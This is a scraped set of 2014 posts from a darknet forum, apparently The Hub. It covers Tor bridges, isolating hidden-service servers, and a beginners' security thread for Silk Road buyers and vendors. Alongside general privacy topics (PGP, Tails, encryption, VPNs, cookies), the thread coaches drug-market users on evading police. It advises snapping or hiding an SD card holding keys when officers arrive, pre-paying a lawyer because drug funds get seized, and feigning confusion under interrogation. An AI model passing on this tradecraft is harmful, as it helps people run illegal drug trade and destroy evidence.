wish to connect to  (if connecting wirelessly) and enter in the password when requested to do so. If you're using a wired connection, Tails will connect to the network automatically.  10. Once you're connected to the network of your choosing, a network configuration utility will appear on your screen. You'll need to click on YES to the first question which is something like ""Does your ISP censor your internet connections"" or words to that effect.  11. Then you'll need to post either one or both of the saved obfs3 Tor bridges from your Persistent folder into the utility where required and hit Enter on your keyboard.  12. That's it. The network configuration utility will then use those obfs3 bridges to connect you to the Tor network. It's good practice IMO to visit  - https://bridges.torproject.org  -  and obtain new bridges prior to closing your current session of Tails to save in your Persistent folder for use when you next connect to the Tor network. It's not a necessity but it's a good idea to use new, fresh bridges (which aren't publicly listed) as much as possible and not keep connecting to the Tor network using older bridges. It depends on factors like how often you're connecting to the Tor network, etc, etc. If you're connecting to Tor and shutting down your sessions of Tails numerous times a day, then you could re-use those bridges more than once however it's a topic of discussion with a variety of opinions from a broad range of individuals so please read all you can before choosing what to do so you can make an educated and informed decision on what approach to take.

What are your opinions on this?",""
"The Hub Forums","whom","1158.0","2014-02-23T17:30:54","Hosting a hidden service on a VPS","General Discussion/Security","No, it's not particularly safe.   But everybody does it anyway.  There are three huge problems with VPS hosting for hidden services: 1.  It's impossible to completely isolate the server from the Tor instance providing the hidden service.   This means that the best you're going to do is a uid-based iptables rule to keep non-Tor traffic from exiting the box.   Quite a few people aren't even bright enough to get this much right.   When someone gets root on the VPS,  they can pull down the iptables rules and deanonymize the box in a second.  Hell, 'ifconfig -a' pretty much deanonymizes the box at that point.  2. The VPS provider has a *complete* level of visibility into your box.   If they choose to, there's really nothing they can't see or do to your environment.  They can strace processes, view memory, take snapshots while your VPS is live,  etc.   Their ability to directly read memory is the worst part.. they can scrape it for crypto keys, capture passwords, etc.   No method or amount of encryption on the VPS can save you from this, BTW.  3.  When someone exploits the VPS-provider console/management interface, they have root on your VPS instance - This one happens fairly often.  Someone exploits a bug in SolusVM or another VPS-provider management console and gets control over every VPS box in their environment.  Including yours.  A better solution is a rented, dedicated server, running Xen or another hypervisor, and using the hypervisor to isolate the server (actually providing the HTTP or other service) from the Tor instance that advertises the .onion address: ServerVM->(Private Virtual Network)->TorVM->(Internet) In that scenario, when someone pwns the ServerVM, they can't deanonymize it by sending arbitrary traffic out.. they're stuck behind the TorVM and can only send traffic via Tor.  To deanonymize the ServerVM effectively, they need to exploit the hypervisor first.   In that architecture, the TorVM should only be allowed to send in/out the Tor traffic.  The hypervisor probably shouldn't even really be on a public network, except to bridge traffic to the TorVM, and damned sure shouldn't accept arbitrary traffic from the Internet itself.  The best solution is physical isolation.   The Server would be on a separate physical box from the Tor instance, connected only by a crossover cable.   However, that architecture is difficult to find in a rented, anonymous environment.    If you're doing something that seriously annoys first-world governments, you probably have to worry about hardware deanonymization in that scenario, too (once someone has access, they can pull serial numbers, MAC addresses, etc that may be able to identify the box via tracing the supply chain).  A few handy tips if you have to use a VPS: 1. Your HTTP server should *not* answer requests on clearnet if it's handling Tor-based requests from a hidden .onion address.   Nothing good is going to come from that, and a million bad things will come from it.   Guaranteed.   Your HTTP service on a VPS should only be bound to localhost, never to a real IP. 2. Actually, your VPS shouldn't be accepting any clearnet traffic, aside from the Tor traffic it needs open to function, and your management traffic. 3. If you can't manage to set up iptables to only allow traffic to/from the Tor process via uid, hosting a hidden service is not for you.  I don't give a shit what benefit you think you're providing to the world, you're just putting yourself and everyone that connects to your box at risk. 4. Bandwidth consumption, CPU/Memory, and storage utilization are the three most visible pieces of information that a VPS provider monitors.  If you're using enough CPU to affect other VPS users the provider stuck on the (overloaded and oversold) VPS hosting box, someone will eventually come looking at what's going on.    Remember, the provider can see your individual process details, so they're going to see that /usr/bin/strange_shit is consuming all the CPU.   And they'll wonder, what is that doing?

FH was at OVH in France.   And, based on OpDarknet logs and their owner's posts on clearnet forums, I'm fairly confident they were using virtual isolation. And however they got caught, I'm fairly sure it wasn't because they incorrectly isolated their server instances.  As with almost any security decision, it's balancing risks and rewards.   VPS-based hosting gives you the risk of being discovered by the VPS provider (assuming you're doing something the provider cares about), and if the box gets hacked, it'll get deanonymized.   You balance that with the awareness that a VPS environment should be disposable, with nothing to tie it to its owner.  Of course, you can't ensure the integrity of any of your data or onion key in that environment, so plan accordingly.  Hosting at home seems stupid once you're deanonymized.  But if you can effectively use physical isolation, and do it right, you are probably much more resistant to being deanonymized in the first place.   I don't think that's as crazy of an idea as people think, but you better be damned sure you're doing it right if you go that route.  There's not a perfect solution.  Anonymously renting a dedicated server and using a hypervisor to provide isolation is probably the best balance.   ",""

Yes, the middlebox TorVM should pretty much just have a Tor instance and properly configured iptables/pf/etc firewall ruleset.   The Tor instance will host the onion service.   The overall picture looks like this: EndUser->(6 x Tor hops to hidden service)->Tor Instance on TorVM->ServerVM  Logically, the only traffic the ServerVM should be seeing from the TorVM is inbound HTTP requests (assuming web server is what we're talking about).  Therefore the only legitimate traffic that the firewall rule on the inside interface of the TorVM should have to allow in that interface are *responses* to HTTP requests.  You could track state on traffic leaving the TorVM for the ServerVM and only allow established connections to come back in.    If you lock it down this far, literally nothing with a SYN bit should be allowed out from the ServerVM.     Once you think it's good, you should at least use nmap or something similar to make sure you can't get traffic out past the TorVM.  You'll have to have a way to manage the ServerVM, so you will need to allow appropriate management traffic to it..   If your management happens over Tor, I'd recommend at least considering the use of client authorization for hidden management services.   In that scenario, your Tor client needs a HidServAuth entry to get to the management onion address, and the TorVM will need to host a separate management onion address/service, with access controlled via the HiddenServiceAuthorizeClient directive.  If I was going to build one on Xen, I'd go disassemble Qubes OS and steal as much as possible.    They already solve most of these problems, they're just doing it from a client perspective instead of a server one.

"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:32:08","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners","          So keep in mind that if you are a user of Silk Road, or any other form of activism, you never want to enter any identifying details about yourself online. Make it so that even if the NSA intercepted and decrypted, or compromised Silk Road that the only information they have against you is your username and password. How safe is that username and password? Does your password contain any identifying information? Is it the same password that you use for your personal email? Does it contain a name of somebody you know personally? Always keep all of these factors in mind.           Another step you must take, especially when communicating with other users on sites such as Silk Road is using PGP encryption. This is not always possible, such as in cases when you are logging into a website, filling out a form, logging into an email, etc.. Consider any type of information you enter into a website using plain text possibly compromised. Never put anything sensitive is any type of plain text format online. PGP comes into play because it uses a very strong method of encryption called cryptography. PGP stands for  Pretty Good Privacy, and it is used for encrypting, decrypting and signing texts, e-mails, files, directories, and whole disk partitions and to increase the security of e-mail communications.            For the more technical users, it uses a serial combination of hashing, data compression, symmetric-key cryptography, and finally public-key cryptography. For the less technical users, the process of encrypting messages using PGP is as follows. You create a private key and a public key. The public key is the key you give out to people you want to send you encrypted messages. Your private key, is kept privately by you. This private key is the only key that can unlock messages that were previously locked with your public key.           If you are still confused, think about it like this. Think about a public key that can go around locking boxes that are intended for you. Anyone can lock a box that is intended for you, but you are the only one with the key to unlock the box. Either if the person who sent you a message locked a box (message) with your public key, they themselves can not unlock it. Only the person possessing the private key can unlock it. If you wish to respond to this person, you must use their public key to encrypt the message you intend to send to them. And they themselves, use their own private key to decrypt the message you sent them.           If you are still with me, I am glad I haven't lost you yet. This is called cryptography and was designed so that anybody intercepting your message could not decrypt the message without your private key. Even if you yourself, lose your private key, there is no method of key recovery. You can consider that message locked forever. So how do you use PGP?            Well before we get to that, I want to introduce you to a  Live Operating System, which makes using PGP encryption and decryption very easy. A live operating system is an operating system that you can run on top of your current operating system. So for example, if you are a Windows user, you have 2 choices. You can download the live operating system, burn it to a CD or DVD and then boot your computer from that DVD or CD. This will make sure your computer run as if you have this operating system installed on your computer. However, if you remove the CD or DVD and reboot, then your computer will boot as normal. You can also use a USB drive to perform this same feature.           Secondly, you can run this live operating system in what's called a Virtual Box. The benefits of this are that you can run Windows simultaneously as you run this other operating system and you can easily switch back and forth between them without rebooting the computer. Both methods have their pros and cons. The pros of running a live CD boot, are that reduce the risk of having your computer compromised by viruses, malware and keyloggers that rely on Windows vulnerabilities to run.      If you are going to run this OS from a Virtual Box, I suggest downloading Virtual Box from Oracle. Note the  https://    https://www.virtualbox.org/     Next, the live operating system I would encourage you to use is  Tails. Tails can be found at the following website.  https://tails.boum.org/     The reason I choose Tails, is because it has many of the security features that you require to stay anonymous already installed. Some users are not happy with Tails, but it really is a great operating system loaded with security features. Many I will talk about in this series on security including PGP encryption and decryption. Make sure you download the Tails ISO file from the official Tails website and you can either load it into Virtual Box or burn it to a DVD or load it onto a USB and booting your computer from that drive.      There are plenty of tutorials on how to load Tails into Virtual Box, so I won't go into much detail other than, make sure you run Virtual Box and Tails from a USB drive or SD card. I would suggest a USB drive however for reasons I will explain later. But basically when when Virtual Box runs directly on your hard drive, it creates a virtual hard drive that is uses as a temporary hard drive while Tails is running. Once Tails is closed, this virtual drive is deleted, but it's not permanently deleted. As we know from the power of recovery tools, deleted files are easily recoverable with the right tools. I will talk about how to protect your files from data recovery tools in future posts but for now, just keep Virtual Box and Tails OFF of your hard drive, and load it either on a USB drive or SD card.     The same goes when booting your computer directly into Tails from a DVD or USB stick. Your hard drive will be used to store files used by Tails, so make sure any files that are saved or accessed using Tails are done from a USB stick or SD card, otherwise they will be recoverable. This is why I prefer using a Virtual Box and running both the Virtual Box and Tails inside of it, off of a USB stick. Keep as much as possible off of your actual hard drive. It is possible to shred files beyond recovery, but it's much easier to do this on a 16gb flash drive, then it is a 1 TB hard drive.      Next post we will get back on topic and start learning how to use PGP. The reason I have to take a detour to using Tails is because we will be using Tails for many of the features from here on out, including PGP.",""
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:33:33","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Welcome back again!     Now that we have PGP figured out, hopefully, I want to remind you that using PGP whenever possible, is very very very important. One of the pitfalls of Silk Road 1, is that some of the administrators, including Ross himself did not always communicate using PGP encryption. Once Ross was busted, they had access to his servers and his computers and anything that wasn't encrypted was wide open for them to look at. Most users on Silk Road 2 believe that Ross had stored personal information about some of Admins and Moderators on his computer in plain text that was used to make 3 more arrests of Silk Road users.      One of the reasons why I would suggest for you to store your PGP keys and other sensitive data on a SD card, is that if that day comes when you are compromised and you get a knock at your door, you have time to dispose of that SD card or USB drive quickly. Even better, if you have a micro SD card that plugs into an SD adapter, then you can snap it with your fingers or at the very least hide it. USBs would need to be smashed into pieces and it might not be easy to do this in the heat of the moment, so do what you feel best about. But always prepare for the day they might come for you.     But our next topic brings us to something called Whole Disk Encryption or Full Disk Encryption. From here on out I will refer to it as FDE (Full Disk Encryption). Tails has a FDE feature built into it, which is another reason why I encourage the use of Tails. It has many of these features to protect you. Essentially FDE will protect your drive, whether SD or USB from the people who may come for you one day. The method in which it does this is it formats your drive and rewrites the file system in an encrypted fashion so that it can be only be accessed by someone who has the pass phrase.      If you lose your passphrase, just like in PGP, there is no recovery. Your only choice is to format the drive and start over again. So make sure you remember it! And please for the love of God, Allah, Buddah, etc... don't store the passphrase on your hard drive somewhere. The tutorial on how to do this is located at the following webpage.  https://tails.boum.org/doc/encryption_and_privacy/encrypted_volumes/index.en.html     Again, always prepare for the day they come knocking, encrypt everything. Use PGP when communicating with others and always shred your files when finished with them. Which brings me to my next topic.  File shredding.     File shredding is extremely important and here is why. If you delete a file from your computer, you are only deleting where it is located on the drive. It is still on the actual drive, just it's location data has been removed. If you take a file recovery tool you can recover virtually any file that you have recently removed. File shredding combats this by overwriting files instead. The idea is that instead of removing the file's location, you need to overwrite the file with random data so that is becomes unrecoverable.      There are a lot of debate happening on whether you can overwrite a file once, or if you need to do it multiple times. Supposedly the NSA recommends 3 times, supposedly the Department of Defense recommends 7 times, and an old paper by a man named Peter Gutmann written in the 90's recommended 35 times. Needless to say, I personally think between 3-7 times is sufficient, and several people out there believe 1 time will get the job done.      The reasoning behind this is that some people believe the drive may miss some files the first time it over writes them and to be more complete, you should do multiple passes. Do what you feel most comfortable with, but I even think 3 passes would be sufficient, although it wouldn't hurt every now and then to run 7 passes and just leave it overnight.      The programs that can do file shredding are ones you will want to run from Windows or whatever operating system your computer is running. These programs can delete your files from your Recycling Bin, delete your temporary internet files and even Wipe your free disk space to make sure everything gets cleaned up. You always need to think, did I have any sensitive material on my hard drive? If so, maybe I need to shred my free disk space. When empting your Recycle Bin, you should always use a shredder. When only deleting under 1gb at a time, you can easily do 7 passes pretty quickly.      To put this in perspective, the leader of a group called LulzSec name Topiary has been banned as part of his sentence from using any type of file shredding applications so that if the FBI wants to check up on him, they can. File shredding keeps your deleted files actually deleted.   Here are some file shredding applications you can use.  http://www.dban.org/ http://www.fileshredder.org/ https://www.piriform.com/ccleaner  Next we're going to talk about removing harmful metadata from files, and some other topics as well.

"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:36:03","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Next I want to talk about good practices when using TOR, Tails and other hidden services.      First of all, it is highly recommended that you use multiple identities online for different things. Perhaps if you are a buyer and a seller on Silk Road, you may want to have separate logins for this. And then possibly a third login for the forums. Then maybe you want to be part of another marketplace, then you might want a fourth login.      Well, Tails has another good program offered by Tails is called KeePassX. When you have multiple logins, it is hard to keep track of them all, so it might be a better idea to keep them all in 1 document that is encrypted with a strong password. KeePassX can help you with this.  https://tails.boum.org/doc/encryption_and_privacy/manage_passwords/index.en.html     You never want to use nicknames or locations, or anything else that is related to yourself online when you post or create usernames. And another thing you need to adopt are new ways of conducting yourself. If you are generally a messy typer, who makes the same grammar mistakes, or the same spelling mistakes all the time, this can be used to identify you. Always proof read anything you post publicly, or privately because the feds will always find ways to correlate things to you.      With Ross Ulbricht, they found an old post he posted on a forum when he first started Silk Road asking people if they had heard of a marketplace called Silk Road. Obviously this is an old trick used by people trying to spread awareness about a new project of theirs. Later he identified himself by saying he was looking for programmers and gave out his private email address on the same forum under the same name.      But if you always misspell the same words, if you always use the same slang terms, capitalize the same words, use a certain amount of periods after an etc.... or always use the same number of !!!!! then all of these things give them reasonable suspicion and it becomes easier to tie things to you. Once they have you under their radar, like they had Ross, it only took a few slip ups and he was theirs. Remember, you only have to make one mistake. So talking about your local election is a really dumb idea, get it?     Think about the time you use your computer. Is it easy to correlate your timezone based on the time you go online? Or is it more random? Do you have patterns that are predictable? Always think about these things when you post online. Always think about what type of personality you are putting out there about your online name.      Expect that every single word you type online is being read by the Feds. To them, this is much easier than tracking drug lords on the streets. They sit in an office and read forum posts and try and make connections. Don't underestimate the feds. Always treat everything as compromised, always treat everybody as compromised and don't ever think anybody will ever go to jail for you. If somebody can avoid 10-20 years by ratting you out, they will do it in a heart beat.      The perfect example is Sabu from LulzSec. After he was busted and facing 112 years in jail, they made him a deal to help them rat out his friends and he ended up getting many of his ""friends"" arrested. Even people who are your friends will turn their backs on you when it comes down to their freedom.",""
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:38:12","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Next entry into the series on security is how to handle getting caught.     Let us face it. We are all human and we make mistakes. Unfortunately, you only need to make one mistake, and the Law Enforcement, commonly referred to as LE on these forums can bust you. Maybe they will wait for you to do something more serious before they nab you, but if you slip up and they feel you are worth going after, you can expect them to get you no matter where you live, with rare exception.     The first thing I want to do is link you to another thread I just came across on these forums.  https://silkroad5v7dywlc.onion/index.php?topic=13093.0  The main question is, should I keep an emergency lawyer fund on hand? And how much should it be. The response I think was most appropriate for this question was the following.      Once you get arrested by  LE, they can seize your money based on the assumption that it is drug related. So you need to have a lawyer paid for ahead of time. That way, in the unfortunate case that you get a visit from the feds, you have a lawyer ready to go. The agreed upon amount was around $50,000.   Next I want to talk to you about what to do in case you get interrogated by  LE. There is a great thread about this.  https://silkroad5v7dywlc.onion/index.php?topic=4461.0     The take homes from this thread are basically. Keep your moouth shut. The feds are going to try all types of tactics on you to get you to admit to guilt of the crimes you are being accused of. They will likely use the good cop, bad cop on you. First they will tell you that they want to help you, and that they are after the big guys. They just need your help to put away the big guys. Do not listen to this, I have never cooperated with a good cop LE and have it end up working in my favor. Once you admit to being guilty, you can kiss your freedom good bye.     Secondly, if you refuse to cooperate, their attitude will change to bad cop. They will say, ""OK fine, you do not want to cooperate? I tried to help but now you are going to be in a lot of trouble. Do you have any idea what kind of charges you are facing? You are going away for a long time unless you start talking.""     They are going to try and scare you into admitting guilt. Again, keep your mouth shut and continue to ask for a lawyer, hopefully the one you put on a $50,000 retainer prior to this happening. Never speak without a lawyer present and never do anything you do not have to do legally. If you have the right to remain silent, then exercise that right. I know there are some circumstances in which you do not have that right, but unless that is the case, you are better off staying quiet.     Third, drop the attitude. Do not argue with the cops about having  nothing on you, or something for that matter. Act scared, anxious and confused. Act like you have no idea what is going on and that you are scared for your life. Tell the cops they are scaring you and you want to see your lawyer because you do not know what this is about. They need evidence, and solid evidence at that, to charge you with a crime.      They are going to try and correlate posts you made on forums, phone numbers you called, perhaps a package shipped to your home, all forms of communication, bank transfers, and so forth, until they can find a way to link you to the crime you are being accused of. But the biggest piece of evidence will always be your willingness to admit your guilt for a lesser sentence.      When Sabu found that he was facing 112 years in federal prison, he quickly spilled everything and started working for the feds. Again, talk to your lawyer, find out the evidence against you and only answers questions your lawyer advises you to answer, and answer them in a way your lawyer advises you to answer them.      Try and be as honest as possible with your lawyer. Your lawyer can not and will not share any admittance of guilt you have with the prosecutors or  LE, this is called Attorney-client privilege. Please note there are a few instances where this does not apply.  https://en.wikipedia.org/wiki/Attorney%E2%80%93client_privilege#When_the_privilege_may_not_apply","Give your lawyer 50k and put him on a retainer.Don't have a emergency fund 'stash' lying around if that is what you mean.... you should already have your lawyer paid + plus extra in case he needs to post bond for you and they seize the majority of your drug funds."
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:39:59","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Ok, now let us talk about why you may want to connect to a VPN over TOR.      The data flow would look like this. You -> Tor -> VPN -> Internet     The benefits of doing that are as follows. You are more anonymous to your VPN in case they happen to keep logs, or if you do something using the VPN that you are not supposed to and a website or server grabs your VPN IP address. In the case of this happening, even if the VPN manages to keep logs of everything you do, they can only identify you as an anonymous TOR user as long as you did not purchase the service like an idiot with your credit card or Paypal account. If you use Bitcoin, and made sure the the Bitcoin trail is not easily traceable you should be okay. Some websites block TOR users from connecting to their websites or servers, by using your VPN to appear as the exit node, you are hiding your TOR activity from the website you are visiting and hopefully bypassing their filters.     Another advantage, is that if your VPN connection does drop, your fall back will be your TOR IP address instead of your real IP address. And finally, if you are passing through a compromised TOR exit node, your information will remain encrypted through the VPN's encryption protocol until it reaches the exit node of the VPN. This is a good thing if you are passing through a compromised exit node, but do not forget that the VPN could be logging everything you are doing anyways.  Do not trust anybody who has access to your unecrypted data!     A few of the downsides of doing things this way, as mentioned in the previous post are that your ISP knows you are using TOR, when and for how long. This may or may not matter to you, but it is just something to consider. Second, you will be unable to visit hidden services websites. Remember those  .onion sites we talked about in the beginning? You need to be connected to the TOR network to visit those hidden service websites.       But I am connected to TOR aren't I? Yes you are, but your final method of communicating with the internet does not come from the TOR network, it comes from your VPN. And your VPN is likely not configured for TOR. In order for you to be able to connect to a hidden services, you must either be connected directly to TOR, or use a VPN to connect to TOR. TOR must be your final node of connectivity in order to visit onion websites.      The choice is ultimately up to you, and every person in every state, province and country will have different reasons for wanting to do VPN to TOR or TOR to VPN, or just TOR, or just VPN. Whatever choice you make, please keep all the things mentioned in this post and the previous post in mind. None of these methods will save you if you enter anything identifying about yourself online. Do not log into your Facebook account using your VPN. Do not check your email or search a nearby address on Google using your VPN. In fact, stay away from Google altogether unless absolutely necessary.     There are two other search engines out now that do not store information about their users.      #1 - DuckDuckGo. They have both a clearnet URL and a hidden services URL for both types of users.    https://www.duckduckgo.com    http://3g2upl4pq6kufc4m.onion/ - Please note the hidden services mirror is not HTTPS     #2 - StartPage. This server also does not store any information about its users.    https://www.startpage.com     Before we move on, I want to go back to how to choose a good VPN. When looking for a VPN provider, you will most likely come across two protocols to choose from. Find out which one your VPN provider is using before you sign up with them. PPTP and OpenVPN. At this time, I am going to highly recommend that you avoid PPTP and stick with OpenVPN providers. Check out this site for a quick comparison.  http://www.goldenfrog.com/vyprvpn/openvpn-vs-pptp     As you can see, PPTP uses a weaker encryption, 128-bit versus 160-bit to 256-bit for OpenVPN. It offers basic security versus a high level of security using something called digital certificates. This is basically a way to make sure they data coming in is sent from your VPN provider and not injected by some malicious third party because the incoming and outgoing data are signed using specially obtained certificates, similar to showing your ID to get into a a restricted area.     The only downside is that setting up OpenVPN can be a little challenging for the less technical users, but there are plenty of great tutorials online to set up OpenVPN providers and your VPN provider itself will likely help you get set up as well. PPTP has been abandoned by those who demand the highest level of security, so I would recommend to avoid it. A third option for VPN providers is L2TP/IPsec, but many users now believe it has also been compromised by the NSA due to its weaker levels of encryption and should be avoided as well.  Stick with OpenVPN.     Lastly, if you want to know how to connect to TOR over a VPN. If you are using OpenVPN like I recommended, then you it is really quite simple. Make sure you are connected to your VPN, check your IP address to on any website such as  WhatIsMyIpAddress.com to make sure it has changed. Then, open TOR or open TAILS and start using TOR and you are now connected to TOR over a VPN.      Connecting to a VPN over TOR is a more tricky and currently above my skill set since OpenVPN reconfigures your network routes so Tor can't be running on the same host. As soon as I figure it out, I will post a tutorial, and if anybody can share an easy way to connect a VPN over TOR, then please share it with this thread.    UPDATE  A method of connecting to a VPN over TOR has been added to this thread but is currently only able to be used by Windows users. You can read it about it at the link below.   CONNECTING TOR -> VPN FOR WINDOWS USERS - http://thehub7gqe43miyc.onion/index.php?topic=52.msg515#msg515    Above URL has been updated.- Captain Jack",""
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:42:12","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Next time I want to talk about is something that most people completely forget about.  Tracking Cookies.  A recent article explains how the NSA uses things like Google Ads and other tracking cookies to identify users over TOR when doing so by other means is not possible.  http://www.washingtonpost.com/blogs/the-switch/wp/2013/12/10/nsa-uses-google-cookies-to-pinpoint-targets-for-hacking/     For those of you who do not know what I am talking about, let me ask you this. Have you ever noticed that certain ads seem to follow you around from website to website? Perhaps something you searched for on Google or Yahoo is now showing up in ads on other pages? This was originally designed to market things to you based on your preferences by installing tracking cookies into your browser.      Luckily TOR clears its cookies every time you restart the browser, and yes Tails does too, but that does not mean you are not vulernable within the same TOR session. What I mean by this is, let us say you went and did some freedom fighting on a forum somewhere and then after, using the same Tor session, visited another website with Google Ads on it. Then you went to another site with more Google Ads on it. You would be surprised how many sites now have Google Ads on them, by the way.     Google can use these tracking cookies to learn about your browsing behavior. Your search terms, your preferred sites, and so forth. Some people are even stupid enough to use the same TOR IP address and go check their Facebook news feed or their email. Guess who is in bed with the feds? Google, Yahoo, Facebook, MSN, and all of their email providers as well. Remember, when you start leaving patterns behind, they will start looking for similarities that start with just a suspicion.     Perhaps they correlated the freedom fighting forum posts with you because you logged into your email, and now they start noticing that you always misspell the same words, make the same grammar mistakes, the same slang terms. Perhaps you visited a website belonging to somebody local to you with Google Ads on it. It is not entirely sure how they are able to use these tracking cookies to identify you, but the point is, they keep everything. And if you happen to do something stupid like Google a local restaurant or what movies are playing in your local area on the same IP address that you did something you should not have earlier on, then Google can put 2 and 2 together.     Once they are on your trail, you are screwed. So do not give them anything to correlate to you, ever! So then you might ask, can not I just disable cookies all together? Yes you could, but, cookies are required for things like login sessions. Without cookies, you are unable to maintain a state of being logged in on certain websites, because they use that cookie ID to identify the session on the server. Again, you can certainly disable cookies, but you will not be able to maintain a login anywhere.",""
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:44:56","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Today we are going to talk about the lengths that law enforcement (LE) will go to try and catch you slipping.      The thread that inspired this post was the following SR thread.  http://silkroad5v7dywlc.onion/index.php?topic=8788.0     The first question is, can LE ship drugs to buyers to try and set them up for drug charges? Let us just say, that they have done it to a Silk Road user before who went by the name of Flush aka Chronicpain aka Curtis Green  http://www.usatoday.com/story/news/nation/2013/11/07/vendor-administrator-plead-guilty-in-silk-road-case/3469751/      So as you can see, whether you view it as entrapment or not, once they have evidence against you, they will eventually figure out a way to get something on you and bust you for it like they did to Curtis Green.     The Secret Service posed as a vendor for fake IDs online for 5 years and actually shipped fake IDs that they made to buyers on an online Russian forum.   http://www.tested.com/tech/456882-how-secret-service-sold-fake-ids-catch-identity-crooks/      As you can see in this article, the Secret Service again sold illegal items to people online in order to bust them. Several of the buyers used their real addresses and sent real photos of themselves to this officer to have their IDs made, resulting in being arrested by the feds.     And in this particular case, the feds charged all the defendants under something called the RICO act.       When you commit crimes online, especially in an online community, the feds may be able to hold you accountable for the actions of other users on that same community. So make sure when you do your freedom fighting, or whatever you choose to do, that you take this into considering. Always weigh out the worst case scenario, should you get busted, because the LE will try and set you up.     One last example of how LE will try and set you up, but not relating to online communities is when they put together a fake sweepstakes in Los Angeles.  http://www.nbclosangeles.com/news/local/La-Mirada-Inspired-by-the-Simpsons-to-Catch-Criminals-78093912.html      So the reason I made this post, was for those of you who think that LE will not go to certain lengths to try and set you up for charges. They will do it if they want you bad enough, and if you fall for it, they might get you on some tough charges. Curtis Green is facing up to 40 years for the sting operation by the DEA on him and the users who purchased fake IDs on the Russian forum could face up to 20 years each since they can be charged under the RICO act. Always keep these things in mind when conducting activities online and always take the worst case scenario into account.     It only takes one mistake to get caught and the government has unlimited resources and super computers to try and catch you slipping. You may only have a few laptops, desktops, servers, but nothing compared to the what they have. Be careful everyone.","In April 2012, a DEA undercover agent in Maryland posing as a drug smuggler began communicating with ""Dread Pirate Roberts"" on Silk Road about selling a large amount of illegal drugs. ""Dread Pirate Roberts"" instructed [Curtis] Green to help the smuggler find a drug dealer who could buy a large amount of drugs, court papers say. Green found a buyer and agreed to act as the middleman for a $27,000 sale of a kilogram of cocaine. Green gave the DEA agent his address.An undercover U.S. Postal Service inspector delivered the cocaine to Green's house in Utah on Jan. 17.;The US Government's ""Operation Open Market"" resulted in indictments against 55 defendants. According to Wired, Special Agent Mike Adams shipped out more than 125 fake IDs over about five years of activity while going by the username Celtic. Amazingly, the entire scheme started when the government arrested the real Celtic, a Nevada man who got caught shopping at a Whole Foods where he'd previously used a fake credit card.Law enforcement discovered counterfeiting equipment among his possessions and learned about his online activities. Adams assumed his online identity and even improved Celtic's cred, shipping near-flawless IDs and becoming a trusted seller on Carder.ru.;""The main indictment is noteworthy because, in addition to the usual mix of credit card fraud and false identification charges, the 39 defendants have been charged under the mob-busting RICO act â a first for a cybercrime prosecution.Enacted in 1970 to help the FBI crack down on the mafia, the Racketeer Influenced and Corrupt Organizations Act lets the feds hold every member of a criminal organization individually responsible for the actions of the group as a whole. The losses collectively inflicted by the Carder.su members are easily enough to give every RICO defendant 20 years in prison."";Sheriff's deputies in La Mirada attempted a rope-a-dope on some alleged criminals by offering them a fake sweepstakes prize.

This is more proof that you only need to screw up once.     You have probably heard me talk about somebody named  Sabu multiple times and maybe you are new to the online communities and you have no idea who I am talking about. Sabu was the leader of a self proclaimed hacktivist group called LulzSec. They were responsible for taking advantage of security exploits in online servers and posting the information online on a website called PasteBin. They had done this many times.  https://www.informationweek.com/attacks/lulzsec-leader-sabu-unmasked-aids-fbi-hacker-sweep/d/d-id/1103214?      During the time all this was happening, the members of this group maintained an online Internet Relay Chat (IRC) channel in which they regularly discussed and took credit for their attacks and exploits. The agreed upon ring leader for these attacks, and this group went by the online handle Sabu. Sabu had also been linked to selling stolen credit cards on Facebook through his online handle, not his real one, which carries a charge of aggravated identity theft.      The group had leaked identities of law enforcement, Sony users, and all wreaked all types of havoc online including DDos attacks on the CIA. The FBI wanted Sabu, they wanted the ring leader, who would eventually be facing charges that could lead to 112 years in prison. But as I mentioned in previous threads, it only takes one mistake to get caught. That is all they need.  http://www.foxnews.com/tech/2012/03/06/exclusive-unmasking-worlds-most-wanted-hacker/      However, this was not his first actual slip up, but it was his first slip up where the feds actually discovered his mistake. His identity was actually discovered, or ""doxed"" previously by another online hacking group called  Backtrace who posted his identity and general location online weeks prior to this in an attempt to dox members of LulzSec.  http://arstechnica.com/tech-policy/2012/03/doxed-how-sabu-was-outed-by-former-anons-long-before-his-arrest/      Two mistakes that we know of, is all that it took to bring down at one time, the World's Most Wanted Hacker. If you are familiar with the story of LulzSec, there was a time they were receiving mainstream news coverage and Sabu had gained a reputation of being this mystical untouchable hacker. Unfortunately for him, he made two small yet very costly mistakes which ended up putting him away. But we are not done yet on this story about Sabu.     Sabu had a weakness, that the feds used as leverage against him when he got busted.      So when you are doing your freedom fighting online, you need to ask yourself. What do I have to lose? Do I have a wife? Children? What would happen if I were to lose everything and be thrown away for 10 to 20 years, could I handle that? If you decide that you are willing to risk all that, then you again need to learn from the mistakes of those who have fallen before you. Ask yourself, if put in a hard place, where you had to choose between life in prison, and cooperation, in order to see your own family, you may think you will not talk now, but you may start talking when the feds are threatening to take them away from you forever.      Once the FBI had the leader of the group LulzSec working for them, they wasted little time getting the former hacker to turn on his friends and aid in their arrests.  Continued next post.","The men have been charged with hacking Fox Broadcasting Company, Sony Pictures Entertainment, and the Public Broadcasting Service (aka PBS). ;Sabu had always been cautious, hiding his Internet protocol address through proxy servers. But then just once he slipped. He logged into an Internet relay chatroom from his own IP address without masking it. All it took was once. The feds had a fix on him.;Sabu occasionally mentioned ownership of a domain called prvt.org in his chats, including those in Backtrace's ""consequences"" document. Every domain registration is associated with corresponding information in the WHOIS database. This information is supposed to include the name and address of the domain's owner.Often this information is incorrect (most domain registrars do nothing to validate it) or anonymized (many firms offer ""proxy"" domain registration, so the WHOIS database contains the details of the proxy registrar, rather than the person using the domain). Monsegur appeared to use one of these anonymizing services, Go Daddy subsidiary Domains By Proxy, for registering the prvt.org domain.The registration for the domain was due to expire on June 25, 2011, requiring Monsegur to renew it. But for some reasonâerror on Monsegur's part perhaps, or screw-up by the 